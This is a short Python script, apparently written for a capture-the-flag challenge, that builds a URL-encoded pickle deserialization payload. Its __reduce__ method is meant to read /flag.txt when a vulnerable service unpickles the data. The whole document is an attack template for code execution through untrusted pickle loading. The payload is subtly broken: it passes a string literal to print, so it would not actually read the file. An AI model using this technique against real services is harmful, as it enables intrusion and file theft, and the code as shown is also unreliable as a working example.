import pickle
import urllib

class payload(object):
    def __reduce__(self):
       return (print, ("open('/flag.txt','r').read()",))

a = pickle.dumps(payload())
a = urllib.quote(a)
# pickle.loads(urllib.unquote(a))
print(a)